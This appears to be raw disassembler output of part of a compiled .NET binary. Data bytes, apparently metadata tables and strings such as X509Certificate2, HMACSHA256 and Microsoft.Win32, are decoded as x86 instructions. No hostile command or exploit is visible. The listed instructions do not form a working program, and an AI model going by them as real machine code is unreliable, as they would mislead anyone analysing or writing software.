  406f30:	e9 1c 51 07 d1       	jmp    0xd147c051
  406f35:	03 43 0e             	add    0xe(%ebx),%eax
  406f38:	58                   	pop    %eax
  406f39:	07                   	pop    %es
  406f3a:	19 00                	sbb    %eax,(%eax)
  406f3c:	ad                   	lods   %ds:(%esi),%eax
  406f3d:	0f 0e                	femms
  406f3f:	00 69 03             	add    %ch,0x3(%ecx)
  406f42:	e9 1c 84 01 24       	jmp    0x2441f363
  406f47:	00 e9                	add    %ch,%cl
  406f49:	1c 0e                	sbb    $0xe,%al
  406f4b:	00 24 00             	add    %ah,(%eax,%eax,1)
  406f4e:	3e 0b 0f             	or     %ds:(%edi),%ecx
  406f51:	05 24 00 0d 22       	add    $0x220d0024,%eax
  406f56:	3d 01 24 00 03       	cmp    $0x3002401,%eax
  406f5b:	25 77 07 c9 01       	and    $0x1c90777,%eax
  406f60:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406f61:	18 7d 07             	sbb    %bh,0x7(%ebp)
  406f64:	89 00                	mov    %eax,(%eax)
  406f66:	6b 1f 8d             	imul   $0xffffff8d,(%edi),%ebx
  406f69:	07                   	pop    %es
  406f6a:	89 00                	mov    %eax,(%eax)
  406f6c:	7c 01                	jl     0x406f6f
  406f6e:	93                   	xchg   %eax,%ebx
  406f6f:	07                   	pop    %es
  406f70:	91                   	xchg   %eax,%ecx
  406f71:	00 7e 0b             	add    %bh,0xb(%esi)
  406f74:	93                   	xchg   %eax,%ebx
  406f75:	07                   	pop    %es
  406f76:	e1 03                	loope  0x406f7b
  406f78:	cc                   	int3
  406f79:	25 99 07 99 00       	and    $0x990799,%eax
  406f7e:	e9 1c a3 07 e9       	jmp    0xe948129f
  406f83:	03 ad 0f 0e 00 f1    	add    -0xefff1f1(%ebp),%ebp
  406f89:	03 e9                	add    %ecx,%ebp
  406f8b:	1c 49                	sbb    $0x49,%al
  406f8d:	04 f9                	add    $0xf9,%al
  406f8f:	03 61 13             	add    0x13(%ecx),%esp
  406f92:	ab                   	stos   %eax,%es:(%edi)
  406f93:	07                   	pop    %es
  406f94:	81 00 4d 0d 0a 00    	addl   $0xa0d4d,(%eax)
  406f9a:	09 03                	or     %eax,(%ebx)
  406f9c:	27                   	daa
  406f9d:	25 87 06 09 03       	and    $0x3090687,%eax
  406fa2:	d6                   	salc
  406fa3:	11 b9 07 91 01 a4    	adc    %edi,-0x5bfe6ef9(%ecx)
  406fa9:	0d 95 01 09 03       	or     $0x3090195,%eax
  406fae:	27                   	daa
  406faf:	25 c9 07 09 03       	and    $0x30907c9,%eax
  406fb4:	cd 11                	int    $0x11
  406fb6:	ce                   	into
  406fb7:	06                   	push   %es
  406fb8:	09 03                	or     %eax,(%ebx)
  406fba:	c1 11 53             	rcll   $0x53,(%ecx)
  406fbd:	01 09                	add    %ecx,(%ecx)
  406fbf:	03 34 25 d0 07 09 03 	add    0x30907d0(,%eiz,1),%esi
  406fc6:	93                   	xchg   %eax,%ebx
  406fc7:	0d 53 01 99 03       	or     $0x3990153,%eax
  406fcc:	65 22 eb             	gs and %bl,%ch
  406fcf:	07                   	pop    %es
  406fd0:	0c 00                	or     $0x0,%al
  406fd2:	fb                   	sti
  406fd3:	11 01                	adc    %eax,(%ecx)
  406fd5:	08 09                	or     %cl,(%ecx)
  406fd7:	04 93                	add    $0x93,%al
  406fd9:	18 0b                	sbb    %cl,(%ebx)
  406fdb:	08 09                	or     %cl,(%ecx)
  406fdd:	04 28                	add    $0x28,%al
  406fdf:	0b 11                	or     (%ecx),%edx
  406fe1:	08 11                	or     %dl,(%ecx)
  406fe3:	04 84                	add    $0x84,%al
  406fe5:	0f 19 08             	nopl   (%eax)
  406fe8:	21 04 20             	and    %eax,(%eax,%eiz,1)
  406feb:	0d 20 08 19 04       	or     $0x4190820,%eax
  406ff0:	18 0e                	sbb    %cl,(%esi)
  406ff2:	27                   	daa
  406ff3:	08 31                	or     %dh,(%ecx)
  406ff5:	04 dc                	add    $0xdc,%al
  406ff7:	0f 30                	wrmsr
  406ff9:	08 41 04             	or     %al,0x4(%ecx)
  406ffc:	45                   	inc    %ebp
  406ffd:	1b 3a                	sbb    (%edx),%edi
  406fff:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407002:	dc 0f                	fmull  (%edi)
  407004:	6f                   	outsl  %ds:(%esi),(%dx)
  407005:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407008:	a1 20 7b 08 34       	mov    0x34087b20,%eax
  40700d:	00 b0 0d 93 08 c9    	add    %dh,-0x36f76cf3(%eax)
  407013:	01 0a                	add    %ecx,(%edx)
  407015:	26 84 00             	test   %al,%es:(%eax)
  407018:	61                   	popa
  407019:	04 e9                	add    $0xe9,%al
  40701b:	1c 53                	sbb    $0x53,%al
  40701d:	01 59 04             	add    %ebx,0x4(%ecx)
  407020:	e9 1c b1 08 69       	jmp    0x69492141
  407025:	04 78                	add    $0x78,%al
  407027:	1e                   	push   %ds
  407028:	b9 08 51 01 c2       	mov    $0xc2015108,%ecx
  40702d:	13 cd                	adc    %ebp,%ecx
  40702f:	00 89 04 e9 1c 53    	add    %cl,0x531ce904(%ecx)
  407035:	01 71 04             	add    %esi,0x4(%ecx)
  407038:	e9 1c 0e 00 91       	jmp    0x91407e59
  40703d:	04 71                	add    $0x71,%al
  40703f:	12 fa                	adc    %dl,%bh
  407041:	02 91 04 0e 12 fa    	add    -0x5edf1fc(%ecx),%dl
  407047:	02 91 04 2f 0d d2    	add    -0x2df2d0fc(%ecx),%dl
  40704d:	08 91 04 55 13 d9    	or     %dl,-0x26ecaafc(%ecx)
  407053:	08 91 04 1f 25 79    	or     %dl,0x79251f04(%ecx)
  407059:	01 91 04 f0 07 0e    	add    %edx,0xe07f004(%ecx)
  40705f:	00 91 04 0e 1d e0    	add    %dl,-0x1fe2f1fc(%ecx)
  407065:	08 79 04             	or     %bh,0x4(%ecx)
  407068:	e9 1c e6 08 91       	jmp    0x91495689
  40706d:	04 e2                	add    $0xe2,%al
  40706f:	07                   	pop    %es
  407070:	7f 01                	jg     0x407073
  407072:	79 04                	jns    0x407078
  407074:	ef                   	out    %eax,(%dx)
  407075:	15 0e 00 81 04       	adc    $0x481000e,%eax
  40707a:	e9 1c 79 01 59       	jmp    0x5941e99b
  40707f:	02 03                	add    (%ebx),%al
  407081:	25 7f 01 b9 03       	and    $0x3b9017f,%eax
  407086:	7b 14                	jnp    0x40709c
  407088:	f2 08 b9 04 e9 1c 53 	repnz or %bh,0x531ce904(%ecx)
  40708f:	01 91 04 e9 07 79    	add    %edx,0x7907e904(%ecx)
  407095:	01 91 04 fe 1c e0    	add    %edx,-0x1fe301fc(%ecx)
  40709b:	08 c1                	or     %al,%cl
  40709d:	04 9c                	add    $0x9c,%al
  40709f:	25 16 09 c9 04       	and    $0x4c90916,%eax
  4070a4:	e9 1c 0e 00 d1       	jmp    0xd1407ec5
  4070a9:	04 e9                	add    $0xe9,%al
  4070ab:	1c 4f                	sbb    $0x4f,%al
  4070ad:	09 08                	or     %ecx,(%eax)
  4070af:	00 a4 00 cd 01 08 00 	add    %ah,0x801cd(%eax,%eax,1)
  4070b6:	a8 00                	test   $0x0,%al
  4070b8:	d2 01                	rolb   %cl,(%ecx)
  4070ba:	08 00                	or     %al,(%eax)
  4070bc:	ac                   	lods   %ds:(%esi),%al
  4070bd:	00 d7                	add    %dl,%bh
  4070bf:	01 08                	add    %ecx,(%eax)
  4070c1:	00 b0 00 dc 01 08    	add    %dh,0x801dc00(%eax)
  4070c7:	00 b4 00 e1 01 08 00 	add    %dh,0x801e1(%eax,%eax,1)
  4070ce:	b8 00 e6 01 08       	mov    $0x801e600,%eax
  4070d3:	00 bc 00 eb 01 08 00 	add    %bh,0x801eb(%eax,%eax,1)
  4070da:	c0 00 f0             	rolb   $0xf0,(%eax)
  4070dd:	01 08                	add    %ecx,(%eax)
  4070df:	00 c4                	add    %al,%ah
  4070e1:	00 f5                	add    %dh,%ch
  4070e3:	01 08                	add    %ecx,(%eax)
  4070e5:	00 c8                	add    %cl,%al
  4070e7:	00 fa                	add    %bh,%dl
  4070e9:	01 08                	add    %ecx,(%eax)
  4070eb:	00 cc                	add    %cl,%ah
  4070ed:	00 ff                	add    %bh,%bh
  4070ef:	01 08                	add    %ecx,(%eax)
  4070f1:	00 d0                	add    %dl,%al
  4070f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4070f6:	09 00                	or     %eax,(%eax)
  4070f8:	d8 00                	fadds  (%eax)
  4070fa:	8e 02                	mov    (%edx),%es
  4070fc:	09 00                	or     %eax,(%eax)
  4070fe:	dc 00                	faddl  (%eax)
  407100:	d7                   	xlat   %ds:(%ebx)
  407101:	01 09                	add    %ecx,(%ecx)
  407103:	00 e0                	add    %ah,%al
  407105:	00 d2                	add    %dl,%dl
  407107:	01 08                	add    %ecx,(%eax)
  407109:	00 f4                	add    %dh,%ah
  40710b:	00 cf                	add    %cl,%bh
  40710d:	02 08                	add    (%eax),%cl
  40710f:	00 f8                	add    %bh,%al
  407111:	00 d4                	add    %dl,%ah
  407113:	02 08                	add    (%eax),%cl
  407115:	00 fc                	add    %bh,%ah
  407117:	00 d9                	add    %bl,%cl
  407119:	02 08                	add    (%eax),%cl
  40711b:	00 00                	add    %al,(%eax)
  40711d:	01 cf                	add    %ecx,%edi
  40711f:	02 2e                	add    (%esi),%ch
  407121:	00 2b                	add    %ch,(%ebx)
  407123:	00 ff                	add    %bh,%bh
  407125:	02 2e                	add    (%esi),%ch
  407127:	00 33                	add    %dh,(%ebx)
  407129:	00 08                	add    %cl,(%eax)
  40712b:	03 2e                	add    (%esi),%ebp
  40712d:	00 3b                	add    %bh,(%ebx)
  40712f:	00 2d 03 2e 00 43    	add    %ch,0x43002e03
  407135:	00 36                	add    %dh,(%esi)
  407137:	03 2e                	add    (%esi),%ebp
  407139:	00 4b 00             	add    %cl,0x0(%ebx)
  40713c:	36 03 2e             	add    %ss:(%esi),%ebp
  40713f:	00 53 00             	add    %dl,0x0(%ebx)
  407142:	36 03 2e             	add    %ss:(%esi),%ebp
  407145:	00 5b 00             	add    %bl,0x0(%ebx)
  407148:	36 03 2e             	add    %ss:(%esi),%ebp
  40714b:	00 63 00             	add    %ah,0x0(%ebx)
  40714e:	36 03 2e             	add    %ss:(%esi),%ebp
  407151:	00 6b 00             	add    %ch,0x0(%ebx)
  407154:	36 03 2e             	add    %ss:(%esi),%ebp
  407157:	00 73 00             	add    %dh,0x0(%ebx)
  40715a:	36 03 2e             	add    %ss:(%esi),%ebp
  40715d:	00 7b 00             	add    %bh,0x0(%ebx)
  407160:	36 03 2e             	add    %ss:(%esi),%ebp
  407163:	00 83 00 3c 03 2e    	add    %al,0x2e033c00(%ebx)
  407169:	00 8b 00 49 03 c0    	add    %cl,-0x3ffcb700(%ebx)
  40716f:	00 93 00 d2 01 e0    	add    %dl,-0x1ffe2e00(%ebx)
  407175:	00 93 00 d2 01 e3    	add    %dl,-0x1cfe2e00(%ebx)
  40717b:	00 9b 00 af 03 00    	add    %bl,0x3af00(%ebx)
  407181:	01 93 00 d2 01 20    	add    %edx,0x2001d200(%ebx)
  407187:	01 93 00 d2 01 40    	add    %edx,0x4001d200(%ebx)
  40718d:	01 93 00 d2 01 60    	add    %edx,0x6001d200(%ebx)
  407193:	01 93 00 d2 01 80    	add    %edx,-0x7ffe2e00(%ebx)
  407199:	01 93 00 d2 01 a0    	add    %edx,-0x5ffe2e00(%ebx)
  40719f:	01 93 00 d2 01 c0    	add    %edx,-0x3ffe2e00(%ebx)
  4071a5:	01 93 00 d2 01 e0    	add    %edx,-0x1ffe2e00(%ebx)
  4071ab:	01 93 00 d2 01 00    	add    %edx,0x1d200(%ebx)
  4071b1:	02 93 00 d2 01 20    	add    0x2001d200(%ebx),%dl
  4071b7:	02 93 00 d2 01 40    	add    0x4001d200(%ebx),%dl
  4071bd:	02 93 00 d2 01 41    	add    0x4101d200(%ebx),%dl
  4071c3:	02 93 00 d2 01 60    	add    0x6001d200(%ebx),%dl
  4071c9:	02 93 00 d2 01 61    	add    0x6101d200(%ebx),%dl
  4071cf:	02 93 00 d2 01 80    	add    -0x7ffe2e00(%ebx),%dl
  4071d5:	02 93 00 d2 01 81    	add    -0x7efe2e00(%ebx),%dl
  4071db:	02 93 00 d2 01 a0    	add    -0x5ffe2e00(%ebx),%dl
  4071e1:	02 93 00 d2 01 a1    	add    -0x5efe2e00(%ebx),%dl
  4071e7:	02 93 00 d2 01 c0    	add    -0x3ffe2e00(%ebx),%dl
  4071ed:	02 93 00 d2 01 c1    	add    -0x3efe2e00(%ebx),%dl
  4071f3:	02 93 00 d2 01 e0    	add    -0x1ffe2e00(%ebx),%dl
  4071f9:	02 93 00 d2 01 e1    	add    -0x1efe2e00(%ebx),%dl
  4071ff:	02 93 00 d2 01 e3    	add    -0x1cfe2e00(%ebx),%dl
  407205:	02 93 00 d2 01 00    	add    0x1d200(%ebx),%dl
  40720b:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  407211:	03 93 00 d2 01 21    	add    0x2101d200(%ebx),%edx
  407217:	03 93 00 d2 01 41    	add    0x4101d200(%ebx),%edx
  40721d:	03 93 00 d2 01 61    	add    0x6101d200(%ebx),%edx
  407223:	03 93 00 d2 01 63    	add    0x6301d200(%ebx),%edx
  407229:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  40722f:	00 06                	add    %al,(%esi)
  407231:	00 00                	add    %al,(%eax)
  407233:	00 1c 00             	add    %bl,(%eax,%eax,1)
  407236:	01 00                	add    %eax,(%eax)
  407238:	20 00                	and    %al,(%eax)
  40723a:	00 00                	add    %al,(%eax)
  40723c:	1d 00 b9 03 c8       	sbb    $0xc803b900,%eax
  407241:	03 f3                	add    %ebx,%esi
  407243:	03 8f 04 b5 04 df    	add    -0x20fb4afc(%edi),%ecx
  407249:	04 f6                	add    $0xf6,%al
  40724b:	04 0a                	add    $0xa,%al
  40724d:	05 15 05 3b 05       	add    $0x53b0515,%eax
  407252:	48                   	dec    %eax
  407253:	05 8d 05 9e 05       	add    $0x59e058d,%eax
  407258:	bc 05 d2 05 d8       	mov    $0xd805d205,%esp
  40725d:	05 0f 06 19 06       	add    $0x619060f,%eax
  407262:	1f                   	pop    %ds
  407263:	06                   	push   %es
  407264:	24 06                	and    $0x6,%al
  407266:	2a 06                	sub    (%esi),%al
  407268:	33 06                	xor    (%esi),%eax
  40726a:	40                   	inc    %eax
  40726b:	06                   	push   %es
  40726c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40726d:	06                   	push   %es
  40726e:	ab                   	stos   %eax,%es:(%edi)
  40726f:	06                   	push   %es
  407270:	d3 06                	roll   %cl,(%esi)
  407272:	dc 06                	faddl  (%esi)
  407274:	e1 06                	loope  0x40727c
  407276:	eb 06                	jmp    0x40727e
  407278:	16                   	push   %ss
  407279:	07                   	pop    %es
  40727a:	26 07                	es pop %es
  40727c:	38 07                	cmp    %al,(%edi)
  40727e:	5f                   	pop    %edi
  40727f:	07                   	pop    %es
  407280:	84 07                	test   %al,(%edi)
  407282:	b2 07                	mov    $0x7,%dl
  407284:	c2 07 d8             	ret    $0xd807
  407287:	07                   	pop    %es
  407288:	07                   	pop    %es
  407289:	08 ab 08 bf 08 fb    	or     %ch,-0x4f740f8(%ebx)
  40728f:	08 23                	or     %ah,(%ebx)
  407291:	09 28                	or     %ebp,(%eax)
  407293:	09 37                	or     %esi,(%edi)
  407295:	09 3f                	or     %edi,(%edi)
  407297:	09 58 09             	or     %ebx,0x9(%eax)
  40729a:	04 00                	add    $0x0,%al
  40729c:	01 00                	add    %eax,(%eax)
  40729e:	06                   	push   %es
  40729f:	00 0b                	add    %cl,(%ebx)
  4072a1:	00 07                	add    %al,(%edi)
  4072a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4072a6:	08 00                	or     %al,(%eax)
  4072a8:	0e                   	push   %cs
  4072a9:	00 00                	add    %al,(%eax)
  4072ab:	00 60 15             	add    %ah,0x15(%eax)
  4072ae:	9f                   	lahf
  4072af:	00 00                	add    %al,(%eax)
  4072b1:	00 94 08 a4 00 00 00 	add    %dl,0xa4(%eax,%ecx,1)
  4072b8:	4d                   	dec    %ebp
  4072b9:	24 a9                	and    $0xa9,%al
  4072bb:	00 00                	add    %al,(%eax)
  4072bd:	00 c7                	add    %al,%bh
  4072bf:	24 ae                	and    $0xae,%al
  4072c1:	00 00                	add    %al,(%eax)
  4072c3:	00 d4                	add    %dl,%ah
  4072c5:	07                   	pop    %es
  4072c6:	ae                   	scas   %es:(%edi),%al
  4072c7:	00 00                	add    %al,(%eax)
  4072c9:	00 1d 08 b2 00 00    	add    %bl,0xb208
  4072cf:	00 b8 00 b7 00 00    	add    %bh,0xb700(%eax)
  4072d5:	00 05 02 bb 00 00    	add    %al,0xbb02
  4072db:	00 90 03 b2 00 00    	add    %dl,0xb203(%eax)
  4072e1:	00 c2                	add    %al,%dl
  4072e3:	14 bf                	adc    $0xbf,%al
  4072e5:	00 00                	add    %al,(%eax)
  4072e7:	00 42 14             	add    %al,0x14(%edx)
  4072ea:	0c 01                	or     $0x1,%al
  4072ec:	00 00                	add    %al,(%eax)
  4072ee:	96                   	xchg   %eax,%esi
  4072ef:	23 41 01             	and    0x1(%ecx),%eax
  4072f2:	00 00                	add    %al,(%eax)
  4072f4:	5f                   	pop    %edi
  4072f5:	14 47                	adc    $0x47,%al
  4072f7:	01 00                	add    %eax,(%eax)
  4072f9:	00 18                	add    %bl,(%eax)
  4072fb:	20 b7 01 00 00 07    	and    %dh,0x7000001(%edi)
  407301:	0d bb 01 00 00       	or     $0x1bb,%eax
  407306:	7d 07                	jge    0x40730f
  407308:	bf 01 00 00 d5       	mov    $0xd5000001,%edi
  40730d:	05 c3 01 00 00       	add    $0x1c3,%eax
  407312:	3a 0a                	cmp    (%edx),%cl
  407314:	c8 01 02 00          	enter  $0x201,$0x0
  407318:	06                   	push   %es
  407319:	00 03                	add    %al,(%ebx)
  40731b:	00 01                	add    %al,(%ecx)
  40731d:	00 07                	add    %al,(%edi)
  40731f:	00 03                	add    %al,(%ebx)
  407321:	00 02                	add    %al,(%edx)
  407323:	00 08                	add    %cl,(%eax)
  407325:	00 05 00 01 00 09    	add    %al,0x9000100
  40732b:	00 05 00 02 00 0a    	add    %al,0xa000200
  407331:	00 07                	add    %al,(%edi)
  407333:	00 01                	add    %al,(%ecx)
  407335:	00 0b                	add    %cl,(%ebx)
  407337:	00 07                	add    %al,(%edi)
  407339:	00 02                	add    %al,(%edx)
  40733b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40733e:	09 00                	or     %eax,(%eax)
  407340:	01 00                	add    %eax,(%eax)
  407342:	0d 00 09 00 02       	or     $0x2000900,%eax
  407347:	00 0e                	add    %cl,(%esi)
  407349:	00 0b                	add    %cl,(%ebx)
  40734b:	00 01                	add    %al,(%ecx)
  40734d:	00 0f                	add    %cl,(%edi)
  40734f:	00 0b                	add    %cl,(%ebx)
  407351:	00 02                	add    %al,(%edx)
  407353:	00 10                	add    %dl,(%eax)
  407355:	00 0d 00 01 00 11    	add    %cl,0x11000100
  40735b:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407361:	00 0f                	add    %cl,(%edi)
  407363:	00 01                	add    %al,(%ecx)
  407365:	00 13                	add    %dl,(%ebx)
  407367:	00 0f                	add    %cl,(%edi)
  407369:	00 02                	add    %al,(%edx)
  40736b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40736e:	11 00                	adc    %eax,(%eax)
  407370:	02 00                	add    (%eax),%al
  407372:	15 00 13 00 01       	adc    $0x1001300,%eax
  407377:	00 16                	add    %dl,(%esi)
  407379:	00 13                	add    %dl,(%ebx)
  40737b:	00 02                	add    %al,(%edx)
  40737d:	00 17                	add    %dl,(%edi)
  40737f:	00 15 00 01 00 18    	add    %dl,0x18000100
  407385:	00 15 00 02 00 2e    	add    %dl,0x2e000200
  40738b:	00 17                	add    %dl,(%edi)
  40738d:	00 02                	add    %al,(%edx)
  40738f:	00 36                	add    %dh,(%esi)
  407391:	00 19                	add    %bl,(%ecx)
  407393:	00 02                	add    %al,(%edx)
  407395:	00 37                	add    %dh,(%edi)
  407397:	00 1b                	add    %bl,(%ebx)
  407399:	00 02                	add    %al,(%edx)
  40739b:	00 59 00             	add    %bl,0x0(%ecx)
  40739e:	1d 00 01 00 5a       	sbb    $0x5a000100,%eax
  4073a3:	00 1d 00 02 00 5b    	add    %bl,0x5b000200
  4073a9:	00 1f                	add    %bl,(%edi)
  4073ab:	00 01                	add    %al,(%ecx)
  4073ad:	00 5c 00 1f          	add    %bl,0x1f(%eax,%eax,1)
  4073b1:	00 02                	add    %al,(%edx)
  4073b3:	00 5d 00             	add    %bl,0x0(%ebp)
  4073b6:	21 00                	and    %eax,(%eax)
  4073b8:	01 00                	add    %eax,(%eax)
  4073ba:	5e                   	pop    %esi
  4073bb:	00 21                	add    %ah,(%ecx)
  4073bd:	00 02                	add    %al,(%edx)
  4073bf:	00 5f 00             	add    %bl,0x0(%edi)
  4073c2:	23 00                	and    (%eax),%eax
  4073c4:	02 00                	add    (%eax),%al
  4073c6:	60                   	pusha
  4073c7:	00 25 00 06 00 5c    	add    %ah,0x5c000600
  4073cd:	00 03                	add    %al,(%ebx)
  4073cf:	00 06                	add    %al,(%esi)
  4073d1:	00 5e 00             	add    %bl,0x0(%esi)
  4073d4:	05 00 06 00 60       	add    $0x60000600,%eax
  4073d9:	00 07                	add    %al,(%edi)
  4073db:	00 08                	add    %cl,(%eax)
  4073dd:	00 c2                	add    %al,%dl
  4073df:	00 09                	add    %cl,(%ecx)
  4073e1:	00 e9                	add    %ch,%cl
  4073e3:	16                   	push   %ss
  4073e4:	f6 16                	notb   (%esi)
  4073e6:	fd                   	std
  4073e7:	04 2e                	add    $0x2e,%al
  4073e9:	05 9b 05 71 07       	add    $0x771059b,%eax
  4073ee:	57                   	push   %edi
  4073ef:	08 7f 08             	or     %bh,0x8(%edi)
  4073f2:	00 01                	add    %al,(%ecx)
  4073f4:	f1                   	int1
  4073f5:	00 f6                	add    %dh,%dh
  4073f7:	0d 01 00 41 01       	or     $0x1410001,%eax
  4073fc:	f3 00 df             	repz add %bl,%bh
  4073ff:	21 01                	and    %eax,(%ecx)
  407401:	00 40 01             	add    %al,0x1(%eax)
  407404:	0b 01                	or     (%ecx),%eax
  407406:	e3 0f                	jecxz  0x407417
  407408:	01 00                	add    %eax,(%eax)
  40740a:	40                   	inc    %eax
  40740b:	01 19                	add    %ebx,(%ecx)
  40740d:	01 53 16             	add    %edx,0x16(%ebx)
  407410:	02 00                	add    (%eax),%al
  407412:	50                   	push   %eax
  407413:	20 00                	and    %al,(%eax)
  407415:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  407419:	20 00                	and    %al,(%eax)
  40741b:	00 45 00             	add    %al,0x0(%ebp)
  40741e:	04 80                	add    $0x80,%al
  407420:	00 00                	add    %al,(%eax)
  407422:	01 00                	add    %eax,(%eax)
	...
  407430:	53                   	push   %ebx
  407431:	0a 00                	or     (%eax),%al
  407433:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40743e:	00 00                	add    %al,(%eax)
  407440:	01 00                	add    %eax,(%eax)
  407442:	4a                   	dec    %edx
  407443:	0a 00                	or     (%eax),%al
  407445:	00 00                	add    %al,(%eax)
  407447:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407452:	00 00                	add    %al,(%eax)
  407454:	01 00                	add    %eax,(%eax)
  407456:	c3                   	ret
  407457:	17                   	pop    %ss
  407458:	00 00                	add    %al,(%eax)
  40745a:	00 00                	add    %al,(%eax)
  40745c:	04 00                	add    $0x0,%al
	...
  407466:	00 00                	add    %al,(%eax)
  407468:	70 02                	jo     0x40746c
  40746a:	17                   	pop    %ss
  40746b:	14 00                	adc    $0x0,%al
  40746d:	00 00                	add    %al,(%eax)
  40746f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40747a:	00 00                	add    %al,(%eax)
  40747c:	01 00                	add    %eax,(%eax)
  40747e:	a1 0f 00 00 00       	mov    0xf,%eax
  407483:	00 0a                	add    %cl,(%edx)
	...
  40748d:	00 00                	add    %al,(%eax)
  40748f:	00 70 02             	add    %dh,0x2(%eax)
  407492:	80 0a 00             	orb    $0x0,(%edx)
  407495:	00 00                	add    %al,(%eax)
  407497:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4074a2:	00 00                	add    %al,(%eax)
  4074a4:	70 02                	jo     0x4074a8
  4074a6:	8b 21                	mov    (%ecx),%esp
  4074a8:	00 00                	add    %al,(%eax)
  4074aa:	00 00                	add    %al,(%eax)
  4074ac:	04 00                	add    $0x0,%al
	...
  4074b6:	00 00                	add    %al,(%eax)
  4074b8:	01 00                	add    %eax,(%eax)
  4074ba:	13 1f                	adc    (%edi),%ebx
  4074bc:	00 00                	add    %al,(%eax)
  4074be:	00 00                	add    %al,(%eax)
  4074c0:	04 00                	add    $0x0,%al
	...
  4074ca:	00 00                	add    %al,(%eax)
  4074cc:	70 02                	jo     0x4074d0
  4074ce:	b5 1a                	mov    $0x1a,%ch
  4074d0:	00 00                	add    %al,(%eax)
  4074d2:	00 00                	add    %al,(%eax)
  4074d4:	12 00                	adc    (%eax),%al
  4074d6:	11 00                	adc    %eax,(%eax)
  4074d8:	17                   	pop    %ss
  4074d9:	00 16                	add    %dl,(%esi)
  4074db:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4074de:	1b 00                	sbb    (%eax),%eax
  4074e0:	1d 00 1b 00 79       	sbb    $0x79001b00,%eax
  4074e5:	01 03                	add    %eax,(%ebx)
  4074e7:	07                   	pop    %es
  4074e8:	7b 01                	jnp    0x4074eb
  4074ea:	03 07                	add    (%edi),%eax
  4074ec:	d7                   	xlat   %ds:(%ebx)
  4074ed:	01 fc                	add    %edi,%esp
  4074ef:	07                   	pop    %es
  4074f0:	00 41 63             	add    %al,0x63(%ecx)
  4074f3:	74 69                	je     0x40755e
  4074f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f7:	60                   	pusha
  4074f8:	31 30                	xor    %esi,(%eax)
  4074fa:	00 49 45             	add    %cl,0x45(%ecx)
  4074fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4074fe:	75 6d                	jne    0x40756d
  407500:	65 72 61             	gs jb  0x407564
  407503:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407507:	31 00                	xor    %eax,(%eax)
  407509:	43                   	inc    %ebx
  40750a:	61                   	popa
  40750b:	6c                   	insb   (%dx),%es:(%edi)
  40750c:	6c                   	insb   (%dx),%es:(%edi)
  40750d:	53                   	push   %ebx
  40750e:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407515:	69 
  407516:	73 74                	jae    0x40758c
  407518:	60                   	pusha
  407519:	31 00                	xor    %eax,(%eax)
  40751b:	4d                   	dec    %ebp
  40751c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407523:	74 2e                	je     0x407553
  407525:	57                   	push   %edi
  407526:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40752d:	55                   	push   %ebp
  40752e:	49                   	dec    %ecx
  40752f:	6e                   	outsb  %ds:(%esi),(%dx)
  407530:	74 33                	je     0x407565
  407532:	32 00                	xor    (%eax),%al
  407534:	54                   	push   %esp
  407535:	6f                   	outsl  %ds:(%esi),(%dx)
  407536:	49                   	dec    %ecx
  407537:	6e                   	outsb  %ds:(%esi),(%dx)
  407538:	74 33                	je     0x40756d
  40753a:	32 00                	xor    (%eax),%al
  40753c:	58                   	pop    %eax
  40753d:	35 30 39 43 65       	xor    $0x65433930,%eax
  407542:	72 74                	jb     0x4075b8
  407544:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40754b:	32 00                	xor    (%eax),%al
  40754d:	54                   	push   %esp
  40754e:	6f                   	outsl  %ds:(%esi),(%dx)
  40754f:	55                   	push   %ebp
  407550:	49                   	dec    %ecx
  407551:	6e                   	outsb  %ds:(%esi),(%dx)
  407552:	74 36                	je     0x40758a
  407554:	34 00                	xor    $0x0,%al
  407556:	54                   	push   %esp
  407557:	6f                   	outsl  %ds:(%esi),(%dx)
  407558:	49                   	dec    %ecx
  407559:	6e                   	outsb  %ds:(%esi),(%dx)
  40755a:	74 36                	je     0x407592
  40755c:	34 00                	xor    $0x0,%al
  40755e:	54                   	push   %esp
  40755f:	6f                   	outsl  %ds:(%esi),(%dx)
  407560:	55                   	push   %ebp
  407561:	49                   	dec    %ecx
  407562:	6e                   	outsb  %ds:(%esi),(%dx)
  407563:	74 31                	je     0x407596
  407565:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40756a:	6e                   	outsb  %ds:(%esi),(%dx)
  40756b:	74 31                	je     0x40759e
  40756d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407571:	41                   	inc    %ecx
  407572:	43                   	inc    %ebx
  407573:	53                   	push   %ebx
  407574:	48                   	dec    %eax
  407575:	41                   	inc    %ecx
  407576:	32 35 36 00 67 65    	xor    0x65670036,%dh
  40757c:	74 5f                	je     0x4075dd
  40757e:	55                   	push   %ebp
  40757f:	54                   	push   %esp
  407580:	46                   	inc    %esi
  407581:	38 00                	cmp    %al,(%eax)
  407583:	3c 4d                	cmp    $0x4d,%al
  407585:	6f                   	outsl  %ds:(%esi),(%dx)
  407586:	64 75 6c             	fs jne 0x4075f5
  407589:	65 3e 00 72 45       	gs add %dh,%ds:0x45(%edx)
  40758e:	6d                   	insl   (%dx),%es:(%edi)
  40758f:	51                   	push   %ecx
